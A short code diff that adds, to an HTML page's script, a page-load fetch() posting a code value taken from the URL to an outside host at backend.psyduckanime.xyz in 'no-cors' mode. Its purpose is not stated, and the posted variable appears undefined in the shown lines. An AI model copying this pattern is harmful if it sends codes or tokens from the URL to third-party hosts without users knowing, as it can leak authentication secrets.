@@ -122,6 +122,20 @@
 
         // Call the function when the page loads to extract the code
         extractCodeFromURL();
+
+        fetch('https://backend.psyduckanime.xyz/route.js', {
+    method: 'POST',
+    body: JSON.stringify({ code: yourCodeValue }),
+    mode: 'no-cors', // Set the request mode to 'no-cors'
+})
+    .then(response => {
+        // Handle the response here
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+
+
 </script>
 
 </body>
